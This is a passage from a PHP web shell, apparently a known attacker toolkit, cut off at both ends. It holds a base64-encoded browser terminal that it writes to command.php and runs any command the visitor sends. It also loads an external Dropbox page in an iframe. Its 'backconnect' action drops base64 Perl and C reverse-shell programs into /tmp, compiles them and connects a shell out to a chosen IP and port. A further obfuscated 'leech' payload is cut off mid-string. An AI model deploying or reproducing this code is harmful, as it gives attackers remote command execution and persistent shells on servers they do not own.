JyAuIGltcGxvZGUoJyIsICInLCAkZXNjYXBlZCkgLiAnIic7Cn0KfQoKZnVuY3Rpb24gb3V0cHV0SGFuZGxlKCRhbGlhc2VzKQp7CmlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKQp7CiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsKfQplbHNlaWYoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJHJlZ3MpKQp7Ci8vIFRoZSBjdXJyZW50IGNvbW1hbmQgaXMgJ2NkJywgd2hpY2ggd2UgaGF2ZSB0byBoYW5kbGUgYXMgYW4gaW50ZXJuYWwgc2hlbGwgY29tbWFuZC4KLy8gYWJzb2x1dGUvcmVsYXRpdmUgcGF0aCA/IgooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsKCi8vIGNvc21ldGljcwp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLi8nLCAnLycsICRuZXdfZGlyKTsKd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOwp3aGlsZSAocHJlZ19tYXRjaCgnfC9cLlwuKD8hXC4pfCcsICRuZXdfZGlyKSkKJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsKCmlmKGVtcHR5KCRuZXdfZGlyKSk6ICRuZXdfZGlyID0gIi8iOyBlbmRpZjsKCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOwp9CmVsc2UKewovKiBUaGUgY29tbWFuZCBpcyBub3QgYSAnY2QnIGNvbW1hbmQsIHNvIHdlIGV4ZWN1dGUgaXQgYWZ0ZXIKKiBjaGFuZ2luZyB0aGUgZGlyZWN0b3J5IGFuZCBzYXZlIHRoZSBvdXRwdXQuICovCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwoKLyogQWxpYXMgZXhwYW5zaW9uLiAqLwokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOwokdG9rZW4gPSBzdWJzdHIoQCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsKaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOwoKJHAgPSBwcm9jX29wZW4oQCRfUkVRVUVTVFsnY29tbWFuZCddLAphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwKMiA9PiBhcnJheSgncGlwZScsICd3JykpLAokaW8pOwoKLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRvdXQuICovCndoaWxlICghZmVvZigkaW9bMV0pKSB7CiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOwp9Ci8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3RkZXJyLiAqLwp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgewokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsKfQoKZmNsb3NlKCRpb1sxXSk7CmZjbG9zZSgkaW9bMl0pOwpwcm9jX2Nsb3NlKCRwKTsKfQp9Cn0gLy8gZW5kIHBocHRoaWVubGUKCi8qIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAjIyMjIyMjIyMKIyMgVGhlIG1haW4gdGhpbmcgc3RhcnRzIGhlcmUKIyMgQWxsIG91dHB1dCBpc3QgWEhUTUwKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMqLwokdGVybWluYWw9bmV3IHBocHRoaWVubGU7CkBzZXNzaW9uX3N0YXJ0KCk7CiR0ZXJtaW5hbC0+aW5pdFZhcnMoKTsKJHRlcm1pbmFsLT5idWlsZENvbW1hbmRIaXN0b3J5KCk7CiR0ZXJtaW5hbC0+YnVpbGRKYXZhSGlzdG9yeSgpOwppZighaXNzZXQoJF9TRVNTSU9OWydwcm9tcHQnXSkpOiAkdGVybWluYWwtPmZvcm1hdFByb21wdCgpOyBlbmRpZjsKJHRlcm1pbmFsLT5vdXRwdXRIYW5kbGUoJGFsaWFzZXMpOwoKaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOwplY2hvICc8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCI/PicgLiAiXG4iOwovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjCiMjIHNhZmUgbW9kZSBpbmNyZWFzZQojIyBibG9xdWUgZm9uY3Rpb24KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMqLwo/Pgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIFhIVE1MIDEuMCBTdHJpY3QvL0VOIgoiaHR0cDovL3d3dy53My5vcmcvVFIveGh0bWwxL0RURC94aHRtbDEtc3RyaWN0LmR0ZCI+CjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWw6bGFuZz0iZW4iIGxhbmc9ImVuIj4KPGhlYWQ+Cjx0aXRsZT48P3BocCBlY2hvICJXZWJzaXRlIDogIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uIiI7Pz4gfCA8P3BocCBlY2hvICJJUCA6ICIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiI7Pz48L3RpdGxlPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgY3VycmVudF9saW5lID0gMDsKdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsKdmFyIGxhc3QgPSAwOwpmdW5jdGlvbiBrZXkoZSkgewppZiAoIWUpIHZhciBlID0gd2luZG93LmV2ZW50OwppZiAoZS5rZXlDb2RlID09IDM4ICYmIGN1cnJlbnRfbGluZSA8IGNvbW1hbmRfaGlzdC5sZW5ndGgtMSkgewpjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXSA9IGRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWU7CmN1cnJlbnRfbGluZSsrOwpkb2N1bWVudC5zaGVsbC5jb21tYW5kLnZhbHVlID0gY29tbWFuZF9oaXN0W2N1cnJlbnRfbGluZV07Cn0KaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lLS07CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQp9CmZ1bmN0aW9uIGluaXQoKSB7CmRvY3VtZW50LnNoZWxsLnNldEF0dHJpYnV0ZSgiYXV0b2NvbXBsZXRlIiwgIm9mZiIpOwpkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsVG9wID0gZG9jdW1lbnQuc2hlbGwub3V0cHV0LnNjcm9sbEhlaWdodDsKZG9jdW1lbnQuc2hlbGwuY29tbWFuZC5mb2N1cygpOwp9Cjwvc2NyaXB0Pgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHtmb250LWZhbWlseTogc2Fucy1zZXJpZjsgY29sb3I6IGJsYWNrOyBiYWNrZ3JvdW5kOiB3aGl0ZTt9CnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDI1MHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQp0ZXh0YXJlYSB7d2lkdGg6IDEwMCU7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMnB4IDJweCAycHg7IGNvbG9yOiAjQ0NDQ0NDOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwO30KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IG9ubG9hZD0iaW5pdCgpIj4KPGgyPkRldmVsb3BlciBCeSBLeW1Mam5rPC9oMj4KCjw/cGhwIGlmIChlbXB0eSgkX1JFUVVFU1RbJ3Jvd3MnXSkpICRfUkVRVUVTVFsncm93cyddID0gMjY7ID8+Cgo8dGFibGUgY2VsbHBhZGRpbmc9IjAiIGNlbGxzcGFjaW5nPSIwIj4KPHRyPjx0ZCBjbGFzcz0iaGVhZCIgc3R5bGU9ImNvbG9yOiAjMDAwMDAwOyI+PGI+UFdEIDo8L2I+PC90ZD4KPHRkIGNsYXNzPSJoZWFkIj48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjoiLiIkX1NFU1NJT05bY3dkXSI7ID8+CjwvdGQ+PC90cj4KPHRyPjx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2xzcGFuPScyJz48Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+IiBtZXRob2Q9InBvc3QiPgo8dGV4dGFyZWEgbmFtZT0ib3V0cHV0IiByZWFkb25seT0icmVhZG9ubHkiIGNvbHM9Ijg1IiByb3dzPSI8P3BocCBlY2hvICRfUkVRVUVTVFsncm93cyddID8+Ij4KPD9waHAKJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOwokcGFkZGluZyA9IHN0cl9yZXBlYXQoIlxuIiwgbWF4KDAsICRfUkVRVUVTVFsncm93cyddKzEgLSAkbGluZXMpKTsKZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOwo/Pgo8L3RleHRhcmVhPgo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4KPGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiIG9ua2V5dXA9ImtleShldmVudCkiIHNpemU9IjYwIiB0YWJpbmRleD0iMSI+CjwvcD4KCjw/IC8qPHA+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIENvbW1hbmQiIC8+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+ClJvd3M6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyb3dzIiB2YWx1ZT0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiIgLz4KPC9wPgoqLz8+CjwvZm9ybT48L3RkPjwvdHI+CjwvYm9keT4KPC9odG1sPgo8P3BocCA/Pg==';
$file = fopen("command.php" ,"w+");
$write = fwrite ($file ,base64_decode($perltoolss));
fclose($file);
echo "<iframe src=command.php width=63% height=700px frameborder=0></iframe> ";
echo "<iframe src=http://dl.dropbox.com/u/74425391/command.html width=35% height=700px frameborder=0></iframe> ";
}//end new command 
elseif ($action == 'backconnect') { !$yourip && $yourip = $_SERVER['REMOTE_ADDR']; !$yourport && $yourport = '7777'; $usedb = array('perl'=>'perl','c'=>'c'); $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj". "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR". "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT". "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI". "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi". "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl". "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="; $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC". "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb". "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd". "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ". "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC". "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D". "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp". "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ=="; if ($start && $yourip && $yourport && $use){ if ($use == 'perl') { cf('/tmp/angel_bc',$back_connect); $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &"); } else { cf('/tmp/angel_bc.c',$back_connect_c); $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c'); @unlink('/tmp/angel_bc.c'); $res = execute("/tmp/angel_bc $yourip $yourport &"); } m("Now script try connect to $yourip port $yourport ..."); } formhead(array('title'=>'Back Connect')); makehide('action','backconnect'); p('
'); p('Your IP:'); makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip)); p('Your Port:'); makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport)); p('Use:'); makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use)); makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt')); p('

'); formfoot(); }//end backconnect
elseif ($action == 'leech') {
$file = fopen($dir."leech.php" ,"w+");
$perltoolss = '';
/*
$perltoolss = 'PD9waHAgJGEgPSAnSUNSaElEMGdKMGxEVW1oSlJEQm5TakJ3U0ZKWFpGRlZNRVoxVld0YVIyUXlT
WGhqUm1oVFlsaFNhRll3Vm5Oa2JFNXhVV3M1YTJKVmNERldWekUwWVZkS2MxSnFRbUZTVjJoNldr
UkdkMVpYVGtWUmJVWllVakprTTFaRlVrdGlNREZJVTJ4b2EyVnRVa3RWYWtFeFpHeGtWMkZGZEd4
aVNFSmFWbFpTYzFZeFduTlRhMmhWVW14S2RWbHRkREJXVjAxM1RsVlNhV0Y2Vm5wWGExWmFUbFV4
U0ZKc2FFNVdNMmhhVkZjMWIyUXhiSE5hU0U1T1VsaFNSbFZXYUVOVlIxSTJVV3Q0VkdFeFdsQlph
a3BUVjFkS1NHVkhiR2hOVlhBelZsVmFhazFYU2toVmFsWlNZVEZLYjFVd1dscE5WbVJ6V1hwR1Ux
WXdXbFpaZWtFeFVrZEdWMU5ZWkZwV2JVNDBXV3RhYm1Wc1VuUlBWMFpYVFRKb05sVXhWbEprTVc5
M1lraENWRmRHV21oVmFrSmFaREZrYzFSdE5XaFdia0pGVkRGb1UxUlZNVmhrUnpWVlVtczFSRlV4
VlRWa1IwWTJWMjF3YkZaWGVETldSV1J6VTIxR1ZrOVVUazVTV0ZKTVZXcEtORTB4WkVWVWEzUnBV
akJ3V1ZReFVrTlpWbFYzVWxSV1ZGWlZOVlJYYlhoV1pERmFjMVJzWkdoTlZuQlZWbXBPYzFNeFZY
aFRiRnBPVm10S1dGVnNXbUZpVmxaWFZteE9VMVpzV25kVk1qRlRWVWRTTmxGcmVGUmhNbEpvV2xa
a1NtVlZNVmhYYlhCT1lsZG9lbGRYZEd0T1IwWjBVMWhzVm1KWWFFdFZhMUpEWW14T2NWUnJPV2xO
V0VKWldsVm9UMVZzUlhsVWFrWllZV3R3V0ZSVlpFZFRSVGxaWTBkMFUwMUhPSGhYVnpCNFVqSlNS
Mk5HVW1GTmJsSmFWRlpWTVZJeFdsaGxSMFpUWWtaYWVsbDZTVEZXYXpGSFYyeFNWMkpZVWxoV1ZF
WnVaREExVmxOc1ZsZFdiRm94VmpCYVQyTnRVbFpqUkZaYVpXMVNSbFpXWXpWamJIQkdXWHBXWVdK
SVFsbFVWbVJ2WVVaWmVscEhOVlpTYXpWRFdXMTRjMlJIVmtsWGJVWnNZVEowTTFkV1ZsZFJNa3Aw
VTJ4b1UySnJTbkJWV0hCWFkxWnNjVk5ZWkdsaGVtdDZWRlZXTUZNeFRrWk9XRTVhVFdwV2FGbHJa
RTlqTURsWlZXeHdWMDF1YURaVk1WWlNaREZ2ZDJKSVFsUlhSbHBvVkZkNFdtUXhiRlpaZWxac1ls
WktTVlV5Y0ZkaFYwcFdWMnBDV0dKRk5YVlpWRVp1WlVaU2NsZHNXbWxTYmtKSVZteGtOR1Z0U25O
V1dHUlhZa1UxV0ZsVVJtRldSbVJGVVZSR1VtSkdTbGRXYkdNeFYxWlZlV1JFUmxSV01uaERWMnBD
TkZaR1JsaGlSVEZvVm10d2RGWnNVa05XTVZWNFYyNUtWMkpGTlZsYVZtUlRVMnhhY2xkc1RsWldi
V1F6V1ZWYVExWnJNVmRTYmxaWVVtc3dkMWxXVm5OalYwMTNUbFZTYUZacmNEWlhWbHBxVFZkT2My
RXpjRlJXTWxKU1ZsUkNSMk5HV2taYVNFNXJWakJaTWxscVNtdFRiVVpWVlc1S1dGSkZXbEJWYlho
WFl6RmtjbGRzV21sVFJUVXhWbXhTUTFZeFZYaFhia3BYWWtVMVdsUlZVbGRSTVZwSFZteGFhV0pI
YUZWVWEyUnpVMjFHVlZWdVNsaFNSVnBRVlcxNFYyTXhaSEpYYkZwcFUwVTFNVlpzWkRCV01WWnpW
MnhhVjJKR1NsaFZiWEJ6VmpGYVdHUklTbWxpUjJoVlZHdGtjMU5zUmpaUmJUVldUVlp3UTFkcVJr
dFhWMFpJWTBkMFdGSnJjRE5YVnpCNFlXczFjbUpGVWxaaWEwcHhWVzF3YzA1V1pITlpNMmhyWWxa
S1NWWnNaR3RVVmxWM1UyeGFXbFp0VGpSWmExVTFZMFpHV0dSSGRGTk5ibWQzVmpKNFdrNVhWblJT
YTJoWFltczFjRlZVUW5KTk1VcEhVbTVhYUUxcldrbFdiVEZ2V1ZaSmVGZHFWbFJXVmtZelYycENj
Mk5zWkhWaVIyeE9ZV3RGZVZVeFZrOVZNa3BZVkc1U1VGZEdTbHBVVkVFeFpHeGtjMXBFVW1wTlYz
UTFWREZrTUZsV1duVmhSRlpZVWxkTmVGWlVSbmRYVmtaMVZHMTRWbVZyVmpOWFZ6VjNaR3h2ZDJO
RmFGaGliWGh3VkZkd1IySldiRFpUYlRscFVqQndTVnBWWkhkaFZURnpVMjVPVkZZelFqWldSM1JQ
WTJ4R2RWVnNjRmROYm1nMlZYcENUMVV3TVVoVFdHaFFWak5vY0ZacVFtRmtNV3h5VkdwT1lVMUlR
a3BXUnpFMFlXMUtjMk5JVGxwTmJtTXhXa1ZhYzFkSFNrbFVhekZTVFVWYWVWZFhkR3RqTWxKWVVs
aHNWV0p0ZUU1VlZFSkhZMnhzVmxwR1pHaFNia0pKVm0wMWMxUkdXa2xVYXpsU1RXMDRNRk42UWxO
VmJVbzJZVWRvVkZKcmIzZFhWM1JQVVRBMVNGTnNhR3hUUmxweFdsZHdRMk5HYkZaaFJrNU9VakEx
UmxscVRtRlVWVEI1VlZod1lWTkhjM2hVVkVGNFRsVTFXVmR0Y0dsV01EUjVWa1phVTJOck5WWlBW
bEpRVmtaS2IxVXdXa3ROUm14eVZHdHdZVTFzV2tsVVZtaFBWVWRLV1dGSE9WcGlWRVp4VkRGV2My
UkdXblZXYTNCb1ZsVndObFl4V21wTlYwcHpVV3hTVkdKWWFIQlpWbFp5WTJ4S1IxSnVXbEJTTVVw
SldXdFNRMkZXU1hoV1dFcFdVbFpGTVZwRVNrZFRWa1pZV2tkR1YwMUVWakpYVnpWelVXMUdWMWRZ
YkZkaVYzaHhWRmN4TTJReFpITlVhMHBQWVRKNFJWVXhhRmRUTVVweFlrWldWbUpHY0V4V2FrWkxW
akZPZEZOcmRFNVNNbWhYVm0xMFlWRXhjSE5VYTFwUVZteEtXRlZVU2xOaE1WSklZa1Z3YUZaVWF6
SlVNRTR3VTJ4T1NWcEhOVlpTVmtVeFdrUktSMU5XUmxoYVIwWlhUVVJXTWxkWE5YTlJiVVpYVkd4
a1VsWXlVbEZaVmxaSFkwWlNTRTFYZEdsU01VcEpXVlZvWVdGck1IaFRia0poVm0xTmVGbFZaRXRY
UmxwWVQxVjBVMkZ0ZUZaV1YzaGhVekZaZUZOc1pGUmlWWEJNVkZaVk1WSXhXbGhsUjBaVFlrWmFl
bFF4VlRWVmJGcFZVbXRrVkdGclZqTlpNRlkwWTBaT1dHSkdRbXhoYldSNVZURldVMDB5VW5SVmEy
aHBVa1ZLY0ZWcVJsWmpiRXBIVW01YVVGSXdNVFpXVjNCWFlWWkplRlpZU2xOU2Exb3lWVEl4UjFO
V1ZuVlZiV3hTVmtWS1RWVlVSbTlsYkZKeVZHMDFhRTFJUW5GVVYzTXhUbFpzY1ZOcVVtcE5WM2d3
VlcwMWMxUldaRWRUYWxaWVZtMVNVRmt5ZERSWFJsSjFWMjFzVTJWdGR6RldSRXB6VVcxR2NrMVZW
bEpYUjFKUFZXdFdSMDB4VVhwWk0yUlVUVVUxVTFscmFIZFhhekIzWTBSS1dtRXlVVEJaVmxwelYx
Wk9XVlZ0Um1sV1ZuQjRWako0VG1WSFJuUlRXR3hzVTBad2NWbFhNRFZpYkU1WlkwVkthMDFFUmta
VlZtaHJWR3hLU1ZSck9WSk5iVko1VlRJeFRtVldVblZpUjJ4T1ltMW9ObFl4WTNoU01sWldaVVpv
YUZORlNtaFVWekZ2Wld4c1YxcEhkR2xOYkVwRlZGWmtkMkZWTVhWaFJFcGFUVzVDTWxkcVFuTk9i
RVpaV2tVMVUxSlZXWHBXUmxaVFpXeFNjbFJ0TldoTlNFSnhWRmR6TVU1V2JIRlRhbEpxVFZkNE1G
VnROWE5VVmxsNFUyMDVXazFxUlhkYVZ6RkhVMFpLZEdSSGJFNU5helIzVmxaU1NrNVhUWGxUV0hC
VVZrWndTMVZVUVhoTk1WSldWV3RLYTAxRVJrWlZWbEpyVWxaV1dFOVZkRkpOVjJoUVdWY3hUMlJG
T1ZsVWJXeFRUVWhDZGxkVVNuSmtNbFp6WTBWb2JGTkZTbWhVVnpGdVpERlNSMXBGT1d0aVZYQkpW
REZvYzFWSFJsWk5WRTVWVmxaS1ExcEVRWGhTVmtaVldrVldWbFo2YkV4WGJYaEdaREZOZDFSc2FG
UmliSEJvVlRCa01GUXhSWGxhU0U1UFRVWktVMWxxUW5kU1JsbDRZMFJLV21KVVZsTmFSVnAzWkVa
S2RWVnRhRmROTW1ONFZrUktjMUV4V1hoalJteFVZbGhTWVZadWNGZGlNVkpHVkd0T1YxWnRlRmxa
VldoaFlWWlpkMVp1Y0ZSV1YyaFFXVlZrUzJSV1VsbFZiWEJPWWtadk1WZFdXbXRYYXpSM1ZXeEth
VTFJUWtWV2FrWjNUV3hzZEU1V1NtdFNNREUxV1d0U1lWbFdXa2hQVnpWVlZteEtURnBFU2xkU1Yw
MTNUbFZTWVUxdVl6RlZhMXBIWkd4T2MySkdTazVTV0ZKRlZqQm9UMVF4UlhsYVNFcFVZbFpLU1Za
dGNGTmhNVVkyVW01S1dHSkhVbEJhUnpGUFpFWktjVkZ0YUZkbGJYZDRWa1JLYzFFeVVsaFRXR3hQ
VmpOb1VWcEljRU5VUmtWNFdqTmtWV0V3TlhWWmEyaHJVbFpXV0U5VmRHRlhSMDR6VlhwQ1QxVnRT
a2xWYkhCWVVsaENNVmRXV21wTlJUVnlZa1ZXVkdKdFVuTlZhMmhQVkRGRmVWcElUbEJXVmtwVFdX
cENkMkV4U1hoU2F6bFNUVzFTZWxScVFsTlZiVWwzWTBWU1YwMUlRblpXTVZKTFRVZEtkRlJ1VWxC
V1JWcHdXV3hhUmsxc1RsWlVhemxwVm01Q01GWXlNSGhaVjBwWFlYcE9VMUpyV2pKVk1uUlBWMFpP
ZFZkdGNHbFdhM0I2VjFSS2QyUnNiM2ROVm14U1lXeEtTMVZ1Y0hKbFJuQkdZVVU1YVZJeFNrWlpl
a0V4VWtadmVXUjZWbE5TYTFveVZUSXhVMU5HVmxsV2JGWk9ZV3hLVUZWVVNtdGpNRFIzVld4S2FV
MUlRa1ZXYWtKM1RXeHJlVTFXVG1sU01EVjRXV3BLYTFSc1pFWlRWRUpVVmxkU2VscEdaRTVsVmxw
eFVXeENhMlZyU2sxVlZFWnVaREZTY2xSdE5XbFRSVXB3V1cxMFNtVkdjRVpTV0dSVVRVVTFXbGw2
UVRGU1JtOTVaRVYwV0ZaNlFURmFWbHAzVTBaYWRXSkdRbWhXVlZrd1YxUkNiMkpzYjNoalJXaFRZ
bTVDYjFWcVJtRmpiRTVXVkdzMVRrMVZjSGhaYTFaWFZXMUdkR042VGxOU2Exb3lWVEl4WVZWck1V
WmtSVkpXWld4YVVsWlVUbXBrTVUxM1ZHeHNhazFFVmtWWGFrb3dVekZrV0UxRVZteFdia0pKVm0w
MWMxVkhSbFpTYWxKYVRVZG9kVmRxU2twbGJGcHhVVzF3VG1KR2JETldSRTVxWkRGTmQxUnNTbWxT
TW5oaFZtcEJNV1ZXWkhGVWEzUnJZbFpLV1ZSc1pEQlZSMFpXVW01R1ZtSllRa2hWYWtGNFZteGtX
V0ZHUW10bGEwcE5WVlJHYm1ReFVuSlVia1pyVFRGd2NWUlVSa3BOVm14eVdrWmFURTFHU2xOWmJu
QnZWMjFLVldKSVNtRldhelZFV2tjeFMyTnRWa2xYYkhCWFRWVlZNVlV4WTNoak1sSllVbXhzVmxa
